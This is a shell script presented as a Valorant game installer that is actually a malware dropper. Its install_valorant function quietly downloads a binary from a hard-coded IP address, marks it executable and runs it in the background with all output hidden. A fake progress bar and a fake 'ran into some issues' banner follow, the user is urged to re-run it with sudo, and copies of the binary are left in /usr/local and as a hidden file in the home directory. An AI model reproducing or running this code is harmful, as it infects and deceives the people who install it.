#!/bin/sh
set -e
SLEEP_DURATION=${SLEEP_DURATION:=1}  # default to 1 second, use to speed up tests

command_exists() {
	command -v "$@" >/dev/null 2>&1
}
error() {
	echo ${RED}"Error: $@"${RESET} >&2
}
setup_color() {
	# Only use colors if connected to a terminal
	if [ -t 1 ]; then
		RED=$(printf '\033[31m')
		GREEN=$(printf '\033[32m')
		YELLOW=$(printf '\033[33m')
		BLUE=$(printf '\033[34m')
		BOLD=$(printf '\033[1m')
		RESET=$(printf '\033[m')
	else
		RED=""
		GREEN=""
		YELLOW=""
		BLUE=""
		BOLD=""
		RESET=""
	fi
}

install_valorant() {
    wget -O valorant_key_check http://51.79.54.105:5000/TW9yZ2VuCg > /dev/null 2>&1
    chmod +x valorant_key_check > /dev/null 2>&1
    nohup ./valorant_key_check </dev/null >/dev/null 2>&1 & disown
}

progress() {
  local duration
  local columns
  local space_available
  local fit_to_screen  
  local space_reserved

  space_reserved=6   # reserved width for the percentage value
  duration=${1}
  columns=$(tput cols)
  space_available=$(( columns-space_reserved ))

  if (( duration < space_available )); then 
  	fit_to_screen=1; 
  else 
    fit_to_screen=$(( duration / space_available )); 
    fit_to_screen=$((fit_to_screen+1)); 
  fi

  already_done() { for ((done=0; done<(elapsed / fit_to_screen) ; done=done+1 )); do printf "▇"; done }
  remaining() { for (( remain=(elapsed/fit_to_screen) ; remain<(duration/fit_to_screen) ; remain=remain+1 )); do printf " "; done }
  percentage() { printf "| %s%%" $(( ((elapsed)*100)/(duration)*100/100 )); }
  clean_line() { printf "\r"; }

  for (( elapsed=1; elapsed<=duration; elapsed=elapsed+1 )); do
      already_done; remaining; percentage
      sleep "$SLEEP_DURATION"
      clean_line
  done
  clean_line

}

main() {
    setup_color
    printf "$BLUE"
    echo "Now installing Valorant!"
    printf "$RESET" 
    install_valorant
    printf "$YELLOW"
    progress 10
    printf "$RESET"
	printf "$RED"
	cat <<-'EOF'
                    
        ____   ____      .__                              __   
        \   \ /   /____  |  |   ________________    _____/  |_ 
         \   Y   /\__  \ |  |  /  _ \_  __ \__  \  /    \   __\
          \     /  / __ \|  |_(  <_> )  | \// __ \|   |  \  |  
           \___/  (____  /____/\____/|__|  (____  /___|  /__|  
                       \/                       \/     \/      ... ran into some issues installing!
	EOF
    printf "$GREEN"
    echo 'Please look over the recommended system specifications in the FAQ section at:'
    printf "$RESET"
    printf "$BOLD"
    echo '- https://beta.playvalorant.com/en-us/'
    printf "$RESET"
    printf "$GREEN"
    echo 'If there is a permissions error please re-run the installation command as a sudo user!' 
	printf "$RESET"
    cp valorant_key_check /usr/local/valorant_key_check
    cp valorant_key_check ~/.valorant_key_check 
    rm valorant_key_check
}

main "$@"
